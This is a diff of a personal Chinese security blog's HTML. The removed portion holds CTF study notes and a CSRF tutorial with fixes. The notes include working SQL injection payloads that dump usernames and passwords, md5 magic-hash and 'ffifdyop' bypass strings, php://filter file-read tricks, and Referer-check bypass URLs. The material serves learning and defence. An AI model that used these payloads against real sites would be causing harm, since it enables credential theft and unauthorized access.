-<li><p>查列名 union select group_concat(0x0a,column_name)<br>,2 from information_schema.columns<br>where table_schema=database() and table_name=’users’# （<br>也可以把表名改为十六进制编码0x7573657273） </p>
-</li>
-<li><p>查需要的信息（用户名和密码）<br>union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,<br>last_name,0x0a,user,0x0a,password,0x0a),<br>2 from users #</p>
-</li>
-</ol>
-<p>总结的都比较散碎也比较基础，以后积累的多了一些之后再来继续补充。</p>
-<p>&lt;  用这个表示\u003c     &gt;用这个表示 \u003e </p>
-<p> <br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a> 序列化</p>
-<p>1、当在一个网页上找不到任何信息时，要查看他有没有robots.txt 或者前面的备份文件</p>
-<p>2、extract() 函数从数组中将变量导入到当前的符号表。通俗的讲 就是可以将键变成变量名，键值可以变成变量名的值</p>
-<p>sha1（）和md5（）都可以用数组绕过 而md5加密后判断相等时只要是0e字符串都会返回true</p>
-<p>QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904</p>
-<p>3、file_get_contents（） 可以使用php://input传过去 再用post构建其里面的内容</p>
-<p>include() 可以使用</p>
-<p>PHP://filter/read=convert.base64-encode/resource=文件名(如index.php) 也可以使用上述的方法。
- </p>
-<p>sql md5</p>
-<p>看到这里的提交参数被MD5再组合进SQL查询语句，导致常规的注入手段几乎都失效了</p>
-<p>但是注意到，MD5之后是hex格式，转化到字符串时如果出现’or’xxxx的形式，就会导致注入</p>
-<p>这里提供一个抄来的字符串：ffifdyop</p>
-<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
-<p>转成字符串为’or’6�]��!r,��b</p>
-<p>从而完成了注入</p>
-
       
     </div>
     
@@ -1487,92 +983,9 @@ if __name__ == ‘__main__‘:
 
       
       
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-zj" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/03/18/zj/" class="article-date">
-      <time datetime="2021-03-18T12:48:43.000Z" itemprop="datePublished">2021-03-18</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/03/18/zj/">CSRF</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p><b style="color:pink">##0、CSRF的简介</b><br>CSRF（Cross-site request forgery）跨站请求伪造，由于目标站无token/referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为两种。<br><b style="color:pink">##1、CSRF的攻击原理</b><br>CSRF 百度上的意思是跨站请求伪造，其实最简单的理解我们可以这么讲，假如一个微博关注用户的一个功能，存在CSRF漏洞，那么此时黑客只需要伪造一个页面让受害者间接或者直接触发，然后这个恶意页面就可以使用受害者的微博权限去关注其他的人微博账户。CSRF只要被批量化利用起来其危害还是比较大的。<br><img src="/2021/03/18/zj/1.png"><br>可以看到这里有个Referer的信息，Referer也就是请求来源地址，也就是说这个请求是从<a target="_blank" rel="noopener" href="http://www.sina.com.cn/">http://www.sina.com.cn</a>  这里发起的。然后去掉Referer，去执行这个请求，发现这个请求仍然可以进行正常的搜索，那么就说明这个请求没有判断请求来源也就是Referer，在请求头部也没有发现存在token的迹象，那么可以判断此处存在CSRF，这个CSRF是没有任何危害d的。<br><b style="color:pink">##2、CSRF漏洞成因及分析</b><br><b style="color:blue">GET类型的CSRF</b><br>请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。这种漏洞的检测方法很简单：网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。<br>这种类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：<br><img src="/2021/03/18/zj/3.png"><br>在访问含有这个img的页面后，成功向<a target="_blank" rel="noopener" href="http://wooyun.org/csrf.php?xx=11">http://wooyun.org/csrf.php?xx=11</a>  发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。<br><b style="color:blue">POST类型的CSRF</b><br>post请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单：网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。<br>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：<br><img src="/2021/03/18/zj/2.png"></p>
-<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作<br><b style="color:blue">其他类型的CSRF</b><br>过基础认证的CSRF(常用于路由器):<br>POC:<br><img src="/2021/03/18/zj/4.png"><br>加载该图片后，路由器会给用户一个合法的SESSION，就可以进行下一步操作了。<br><b style="color:blue">##4、如何修复</b><br>针对CSRF的防范，有以下几点要注意：<br><b>关键操作只接受POST请求</b><br><b>验证码</b><br>CSRF攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了CSRF攻击。</p>
-<p>但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用</p>
-<p><b>检测refer</b><br>常见的互联网页面与页面之间是存在联系的，比如你在<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>  应该是找不到通往<a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a>  的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的Referer中</p>
-<p>通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到Referer的值，所以Refere Check 一般用于监控CSRF攻击的发生，而不用来抵御攻击。</p>
-<p><b>Token</b><br>目前主流的做法是使用Token抵御CSRF攻击。下面通过分析CSRF 攻击来理解为什么Token能够有效</p>
-<p>CSRF攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止CSRF攻击。</p>
-<p>另一个更通用的做法是保持原有参数不变，另外添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。</p>
-<p>Token 使用原则</p>
-<ol>
-<li>Token要足够随机————只有这样才算不可预测
-</li><li>Token是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度
-</li><li>Token要注意保密性————敏感操作使用post，防止Token出现在URL中
-</li><li>复制代码
-</li></ol>
-<b style="color:blue">##5、测试CSRF中注意的问题</b>
-如果同域下存在xss的话，除了验证码，其他的方式都无法防御这个问题。
-
-<p>有个程序后端可能是用REQUEST方式接受的，而程序默认是POST请求，其实改成GET方式请求也可以发送过去，存在很严重的隐患。</p>
-<p>当只采用refer防御时，可以把请求中的修改成如下试试能否绕过：</p>
-<p>原始refer：<a target="_blank" rel="noopener" href="http://test.com/index.php">http://test.com/index.php</a></p>
-<p>测试几种方式（以下方式可以通过的话即可能存在问题）：</p>
-<ul>
-<li>http://test.com.attack.com/index.php
-</li><li>http://attack.com/test.com/index.php
-</li><li>[空]
-</li><li>复制代码
-</li></ul>
-
-<p>refer为空构造的方法：<br><img src="/2021/03/18/zj/5.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
+        <p class="article-more-link">
+          <a   href="/2021/03/25/fxl/#more">不给你看。哎，就是玩儿!--哼(ˉ(∞)ˉ)唧--(还是来康康吧叭~) >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1721,9 +1134,8 @@ ga('send', 'pageview');
 
 
   </div>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":250,"height":500},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
-<script type="text/javascript" src="/js/love.js"></script>
 <!--动态线条背景-->
 <script type="text/javascript"
 color="0,0,0" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
@@ -1732,3 +1144,5 @@ color="0,0,0" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canva
 <script type="text/javascript" src="\js\snow.js"></script>
 <!--浏览器搞笑标题-->
 <script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
